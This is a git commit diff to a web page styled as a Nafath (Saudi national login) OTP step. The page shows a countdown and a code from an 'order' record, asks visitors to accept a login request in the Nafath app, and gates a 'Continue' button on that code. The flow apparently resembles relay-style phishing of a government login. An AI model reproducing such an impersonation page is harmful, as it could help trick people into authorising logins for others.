5557bdaad7e08335c3fc95a4297f5cb8272f0004
AbdullahEsha <shahariaresha@gmail.com>
2024-04-20 02:10:00 +0600

    update countdown bug

--- pages/nafat-otp-two/index.js
+++ pages/nafat-otp-two/index.js
@@ -58,7 +58,6 @@ const NafatOtpTwo = () => {
         <h1 className="text-4xl font-bold text-gray-600 mt-10">
           Nafath App OTP2
         </h1>
-
         {/* a countdown timer for 180s design */}
         <div className="flex justify-center items-center gap-2 mt-5 border-4 h-28 w-28 rounded-full">
           <h1 className="text-2xl font-bold text-gray-600 m-0">
@@ -66,7 +65,6 @@ const NafatOtpTwo = () => {
           </h1>
           <h1 className="text-2xl font-bold text-gray-600 m-0">{time % 60}</h1>
         </div>
-
         <p className="text-gray-600 text-center mt-5 font-bold">
           رجى قبول طلب تسجيل الدخول من تطبيق نفاذ
         </p>
@@ -74,13 +72,11 @@ const NafatOtpTwo = () => {
           Please accept the login request from Nafath app
         </p>
         {/* a countdown design round border */}
-
         <div className="flex justify-center items-center gap-2 rounded-full border-2 h-16 w-16">
           <p className="text-gray-600 text-center m-0 font-bold">
             {order.nafatOtpTwo ? order.nafatOtpTwo : 'N/A'}
           </p>
         </div>
-
         <Link
           href="https://play.google.com/store/apps/details?id=sa.gov.nic.myid"
           target="_blank"
@@ -88,23 +84,23 @@ const NafatOtpTwo = () => {
         >
           OPEN NAFATH APP
         </Link>
-        {/* {order.nafatOtpTwo ? ( */}
-        <form onSubmit={handleSubmit} className="w-3/4 my-14">
-          <button
-            type="submit"
-            className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
-          >
-            Continue To Profession <FaArrowRightLong size={16} />
-          </button>
-        </form>
-        {/* ) : (
+        {order.nafatOtpTwo ? (
+          <form onSubmit={handleSubmit} className="w-3/4 my-14">
+            <button
+              type="submit"
+              className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
+            >
+              Continue To Profession <FaArrowRightLong size={16} />
+            </button>
+          </form>
+        ) : (
           <button
             onClick={reload}
             className="flex gap-2 justify-center items-center rounded-sm font-bold my-14 w-3/4 px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-gray-500 hover:bg-gray-600 focus:outline-none focus:bg-gray-600"
           >
             Reload Page
           </button>
-        )} */}
+        )}
       </div>
       <div className="h-20 bg-teal-400 mt-5"></div>
     </>
